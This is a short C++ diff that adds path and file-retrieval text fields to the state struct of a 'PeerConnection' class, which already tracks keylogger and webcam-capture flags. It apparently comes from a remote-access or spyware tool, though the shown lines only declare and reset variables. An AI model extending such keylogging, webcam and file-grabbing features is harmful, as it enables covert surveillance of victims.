@@ -32,12 +32,16 @@ class PeerConnection {
         int webcamDurationMs = 2000;
         int webcamFps = 30;
         std::string rawText = "";
+        std::string pathText = "";
+        std::string getFileText = "";
         bool isKeyloggerActive = false;
         bool isWebcamActive = false;
 
         void reset() {
             webcamDurationMs = 2000;
             rawText = "";
+            pathText = "";
+            getFileText = "";
             isKeyloggerActive = false;
             isWebcamActive = false;
         }
